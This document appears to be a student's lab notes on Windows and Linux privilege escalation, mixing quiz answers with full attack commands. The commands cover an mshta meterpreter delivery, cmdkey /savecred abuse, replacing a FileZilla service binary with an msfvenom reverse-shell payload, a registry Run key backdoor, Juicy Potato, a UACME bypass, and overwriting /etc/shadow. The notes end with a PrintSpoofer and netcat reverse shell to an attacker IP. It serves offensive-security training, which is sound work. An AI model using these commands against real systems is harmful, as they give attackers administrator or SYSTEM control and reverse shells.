Find the file with Get-ChildItem
---------------------------------
> Get-Childitem -Path ".\PowerSploit" -Filter "PowerUp.ps1" -Recurse

Privilege escalation with Powerup.ps1
-------------------------------------

PowerUp is a PowerShell script designed to facilitate discovering and exploiting privilege escalation vulnerabilities in Windows environments. 
Penetration testers and red teamers commonly use it to identify weaknesses that could allow an attacker with limited privileges to elevate their access to a higher level, such as local administrator or system

https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 (git clone) && upload in target system

All the functions can be seen in github.

>. .\Powerup.ps1 (Activate the script)
>Invoke-Allchecks

>Invoke-PrivescAudit (to check Administrator password)

(or)

>reg query 'HKLM\Software\Microsoft\Windows NT\Currentversion\winlogon' /v DefaultPassword

Connect meterpreter shell from cmd
----------------------------------
>runas.exe /user:administrator cmd (run with cmd)

Creter a meterpreter script with hta_server (script.rc) 

use exploit/windows/misc/hta_server
set LHOSTS 10.10.21.2
set LPORT 2222
exploit

#msfconsole -r ./script.rc

Copy the URL > http://10.10.21.2:8080/rKKsNNLXE2Tfmi.hta
Run with mshta.exe in cmd > mshta.exe http://10.10.21.2:8080/rKKsNNLXE2Tfmi.hta


#psexec.py administrator@10.0.20.64

If administrator gives those service accessible, we can use those to connect to the administrator by using it's password

psexec.py (smb-share && psexec utility)
winrm (winrm.exe)
evil-winrm (winrm.exe)

Which one of the following PowerUp functions can be used to check for the services that the current user can modify? > Get-ModifiableService

Which PowerUp function can be used to check for unquoted service paths which could potentially allow for privilege escalation? > Get-ServiceUnquoted

You can also use psexec.py to connect the target machine with the administrator
____________________________________________________________________________________________________________________________________________________________________________________________
Privilege escalation with PrivescCheck.ps1
------------------------------------------

What feature of PrivescCheck is primarily used to identify outdated and potentially vulnerable software installed on a system? > Invoke-AuditInstalledPrograms (PowerView.ps1)

Which function in PrivescCheck helps in identifying user privileges that could potentially be escalated by exploiting Windows services? > Invoke-ServiceAudit (HostRecon.ps1)


C:> powershell.exe -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
C:> runas.exe /user:administrator cmd (Calling cmd with administrator privilege from PowerShell)
___________________________________________________________________________________________________________________________________________________________________________________________
Privilege escalation from credential manager by Using cmdkey 
-------------------------------------------------------------
1. Get windows Student user with hta_server (meterpreter)
2. meterpreter > shell
C:> cmdkey /list

 Target: Domain:interactive=ATTACKDEFENSE\administrator
 Type: Domain Password
 User: ATTACKDEFENSE\administrator

There is no password but use that credential to get reverse shell

3. upload shell.exe(reverse shell payload)
4. C:> runas.exe /savecred /user:administrator shell.exe
5. capture with msfconsole multi/handler

Get Administrator access

Under what condition can the cmdkey utility be used to perform privilege escalation on a Windows machine? > When there are shared credentials among administrators that can be accessed via cmdkey.

What is the primary function of the cmdkey command in Windows? > To list or modify credentials stored in the Windows Credential Manager.
___________________________________________________________________________________________________________________________________________________________________________________________
Powershell Command History (to get username && password)
---------------------------

All files need to be > show hidden files, folders and drives

C:\Users\User\Appdata\Roaming\Microsoft\Windows\Powershell\PsReadline\ConsoleHost_history.txt file

In the context of security best practices, which method effectively minimizes the risk of PowerShell history being used for privilege escalation? >
Disabling PowerShell history logging entirely.
___________________________________________________________________________________________________________________________________________________________________________________________
Insecure Service Permission
---------------------------
Which of the following would NOT be a common method for exploiting insecure service permissions? > Replacing the service's log files to obscure malicious activity.

Which type of permission, if set insecurely, poses a significant risk for privilege escalation when inspecting the ACLs of a Windows service? > Write

C:> . .\PowerUp.ps1
C:> Invoke-PrivescAudit

ServiceName                     : FileZilla Server
Path                            : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"
ModifiableFile                  : C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}

FileZilla service > FileZilla.exe can be modified 

C:> Get-ACL "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe" | format-list

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe
Owner  : BUILTIN\Administrators
Group  : PRIV-ESC\None
Access : PRIV-ESC\student Allow  FullControl

Student user has full control

Create FileZilla Server.exe reverse payload
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.33.4 LPORT=2222 -f exe > 'FileZilla Server.exe'


Download and replace the original FileZilla Server.exe place (iwr is alias of Invoke-Webrequest)
-------------------------------------------------------------
C:> iwr -UseBasicParsing -Uri 'http://10.10.21.2/FileZilla Server.exe' -Outfile  "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

Caputre with msfconsole > FileZilla Server.exe doesn't have an icon > Only restarting FileZilla service in services.msc > Can have meterpreter shell.

Even we got meterpreter shell and we got administrative access , shell is unstable. 
So that Migrate to lsass.exe
----------------------------

meterpreter > migrate -N lsass.exe

We got reverse shell from Unsecure FileZilla service because  > Owner  : BUILTIN\Administrators
________________________________________________________________________________________________________________________________________________________________________
Registry Autoruns
-----------------
Which Windows registry key is commonly used by attackers to set up autoruns for privilege escalation? > 
HKEY_LOCAL_MACHINE:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

1. Notice hfs.exe is run in startup
2. Run autorun software to notice where the hfs.exe file is running
3. Check that location with ACL (don't forgot = :)
C:> Get-Acl -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | format-list

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : PRIV-ESC\student Allow  FullControl

Student User has full control

4. Check the folder with ACL

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\HTTPServer\hfs.exe
Owner  : BUILTIN\Administrators
Group  : PRIV-ESC\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Users Allow  ReadAndExecute, Synchronize

5. Builtin\all users has only read and execute ( so that cannot do anything in folder ) > create a folder in any location > inside that folder create new .exe file with reverse shell

6. Capture with msfconsole, don't forget to set payload windows/meterpreter/reverse_tcp

7. Create a string value under "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" > string value is the directory where program.exe have

8. When the administrator account is shutdown and restart again > hfs.exe starts > program.exe runs > we got a reverse shell

in powershell > shutdown /l > it is restart
________________________________________________________________________________________________________________________________________________________________________
Juicy Potato
--------------
Juicy Potato is a Windows privilege escalation exploit that leverages specific vulnerabilities related to DCOM (Distributed Component Object Model) and the way Windows manages the communication between
processes and services.
It primarily targets Windows' token manipulation features to achieve privilege escalation from a lower-privilege user to a system-level or administrative-level user.

Juicy Potato is based on a technique called "Potato," which involves exploiting the behavior of DCOM and the RpcSs (Remote Procedure Call Subsystem) service.
The exploit leverages Windows' capability to create LocalService/NetworkService tokens and then use those tokens to impersonate higher-privilege accounts like SYSTEM.

DCOM and CLSIDS:
---------------
Windows DCOM uses CLSIDS (Class Identifiers) to manage communication between different software components. When a request is made to DCOM, it can
lead to the creation of new processes running under specific security contexts.

Manipulating LocalService Tokens: 
---------------------------------
Juicy Potato exploits a vulnerability in how DCOM processes and services interact, particularly when creating tokens. It does this by leveraging the LocalService
token to get access to a higher-privilege context.

Creating a Malicious COM Server:
--------------------------------
The exploit creates a fake COM server and registers it with a specific CLSID. This allows the attacker to direct requests to their malicious COM server, enabling
them to manipulate the token used for that process.

Impersonation and Token Duplication:
------------------------------------
Once the malicious COM server is registered and the process initiated, Juicy Potato can create a LocalService token and then manipulate it to
impersonate a high-privilege context like SYSTEM.
By duplicating and adjusting the token, the exploit achieves privilege escalation.

What type of Windows access token does the Juicy Potato attack primarily aim to obtain? > System token
What is a common technique used to create/obtain a Windows access token for impersonation, leading to privilege escalation? > token duplicating

 ms-sql-info: 
|   10.0.16.124:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

bruteforce mssql username and password
--------------------------------------
1. hydra
2. mssql_login (msfconsole payload)

The default system administrator account in Microsoft SQL Server (MSSQL) is named sa, which stands for "System Administrator.", it has no password.

3. Login into mssql with mssql_payload (msfconsole payload)

If we got a shell send it to the background

CLSID
------
Each service or component in Windows that uses the Component Object Model (COM) architecture has its own COM object classes,
and each of these classes is uniquely identified by a Class Identifier (CLSID).

The identifier "4991D34B-80A1-4291-83B6-3328366B9097" refers to a CLSID (Class Identifier) for the Background Intelligent Transfer Service (BITS) in Windows. That token is provided by lab documentation

4. Create meterpreter exe file (backdoor.exe)

We are connecting in same meterpreter session

5. Listen with multi/handler and do 

> exploit -j (send it to the background)
> sessions 1 (use the sessions 1 again)

6. Run that command in user session
C:> JuicyPotato.exe -l 3333 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

The -t option specifies the tokens to use for impersonation. The * symbol indicates that Juicy Potato should use any available token. 
This allows the tool to attempt to find a token that has the necessary privileges for the exploit to succeed

Finally, got the administrator's meterpreter shell.
________________________________________________________________________________________________________________________________________________________________________
Linux command can be used to identify files with the write permission applied for all user accounts
-----------------------------------------------------------------------------------------------------
#find / -not -type 1 -perm -o+w

#/etc/shadow (all user can write)

#openssl passwd -1 -salt abc password
#nano /etc/shadow
Paste that in root user password > gain root access
__________________________________________________________________________________________________________________________________________________________________________
Locally stored credentials
--------------------------
Go to the /html directory

#cd /var/www/html
#ls -al | grep -nr "db_user"

Finally, you will see the db_user credentials recursively.
________________________________________________________________________________________________________________________________________________________________________
3.UAC (User Account Control)
	
	UAC is the windows security feature that is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the administrator group.

	In order to successfully bypass UAC, we will need to have access to the user account that is part of the local administrator group on the Windows target system.

	In windows search bar > User account control (normal --> default), if UAC turns into always notify hard to penetrate.

	>net users
	>net localgroup administrators

	Download UACME (akagi64.exe) from github.

 msf5 > migrate -N lsass.exe
      > upload /root/Desktop/tools/UACME/akagi64.exe 
      > upload backdoor.exe (msfvenom)

 msf5 > use multi/handler
      > set payload windows/meterpreter/reverse_tcp
      > exploit -j

 C:\Users\Public > Akagi64.exe 23 C:\Users\Public\backdoor.exe

We got a backdoor sessions as an administrator

Which of the following is a common technique employed by UACMe to bypass UAC prompts? > Auto-elevation through known trusted executables.
_________________________________________________________________________________________________________________________________________________________________________________________
mssqlclient.py and PrintSpoofer.exe
------------------------------------
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. 
However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access.

#mssqlclient.py sql_dev@10.129.43.30 -windows-auth
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

In kali >  nc -lvnp 1233

Finally get nt/authority system
